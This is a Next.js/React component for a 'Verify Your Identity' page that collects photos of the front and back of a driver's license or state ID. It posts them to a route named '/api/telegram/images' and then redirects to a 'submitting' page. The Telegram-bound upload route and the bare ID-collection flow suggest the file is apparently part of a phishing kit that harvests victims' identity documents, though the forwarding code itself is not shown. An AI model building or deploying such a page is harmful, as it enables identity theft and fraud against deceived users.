'use client';

import { useEffect, useState } from 'react';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import styles from './identity.module.css';

interface ImageUploadProps {
  label: string;
  previewUrl: string | null;
  onImageChange: (file: File | null) => void;
  isMobile: boolean;
}

const ImageUpload = ({ label, previewUrl, onImageChange, isMobile }: ImageUploadProps) => {
  const id = label.toLowerCase().replace(/\s/g, '-');

  const handleFile = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0] || null;
    onImageChange(file);
  };

  return (
    <div className={styles.upload}>
      <h3>{label}</h3>
      {previewUrl ? (
        <Image src={previewUrl} alt={`${label} preview`} width={250} height={150} className={styles.preview} />
      ) : (
        <div className={styles.placeholder}>📸</div>
      )}
      <div className={styles.controls}>
        {isMobile && (
          <label htmlFor={`${id}-camera`} className={styles.buttonBlue}>
            📸 Snap Photo
          </label>
        )}
        <label htmlFor={`${id}-file`} className={styles.buttonGreen}>
          📂 Upload
        </label>
      </div>
      {isMobile && (
        <input type="file" id={`${id}-camera`} accept="image/*" capture="environment" onChange={handleFile} hidden />
      )}
      <input type="file" id={`${id}-file`} accept="image/*" onChange={handleFile} hidden />
    </div>
  );
};

export default function IdentityVerificationForm() {
  const [frontFile, setFrontFile] = useState<File | null>(null);
  const [backFile, setBackFile] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);
  const [isMobile, setIsMobile] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  useEffect(() => {
    setIsMobile(/Mobi|Android/i.test(navigator.userAgent));
  }, []);

  const handleChange = (side: 'front' | 'back', file: File | null) => {
    if (!file) return;
    if (file.size > 5 * 1024 * 1024) {
      setError('File too large (max 5MB)');
      return;
    }

    setError(null);
    const preview = URL.createObjectURL(file);

    if (side === 'front') {
      setFrontFile(file);
      setFrontPreview(preview);
    } else {
      setBackFile(file);
      setBackPreview(preview);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!frontFile || !backFile) {
      setError('Both images are required');
      return;
    }

    setLoading(true);
    const formData = new FormData();
    formData.append('front', frontFile);
    formData.append('back', backFile);

    try {
      await fetch('/api/telegram/images', {
        method: 'POST',
        body: formData,
      });
      router.push('/submitting');
    } catch (err) {
      console.error(err);
      setError('Upload failed');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className={styles.page}>
      <form className={styles.card} onSubmit={handleSubmit}>
        <h2>Verify Your Identity</h2>
        <p>Upload images of your <strong>Driver’s License</strong> or <strong>State ID</strong></p>

        <ImageUpload
          label="Front of ID"
          previewUrl={frontPreview}
          onImageChange={(file) => handleChange('front', file)}
          isMobile={isMobile}
        />
        <ImageUpload
          label="Back of ID"
          previewUrl={backPreview}
          onImageChange={(file) => handleChange('back', file)}
          isMobile={isMobile}
        />

        {error && <p className={styles.error}>{error}</p>}

        <button type="submit" className={styles.submit} disabled={loading}>
          {loading ? 'Submitting...' : 'Submit'}
        </button>
      </form>
    </div>
  );
}
